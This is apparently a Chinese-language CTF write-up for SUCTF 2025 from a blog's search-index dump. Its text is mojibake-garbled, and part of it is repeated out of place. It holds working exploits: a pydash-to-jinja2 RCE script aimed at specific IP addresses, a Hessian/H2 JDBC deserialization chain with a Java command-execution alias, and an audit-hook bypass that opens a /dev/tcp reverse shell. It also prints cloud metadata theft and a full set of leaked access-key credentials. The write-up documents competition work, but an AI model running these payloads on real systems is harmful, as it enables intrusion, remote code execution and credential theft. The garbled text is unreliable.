\u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ 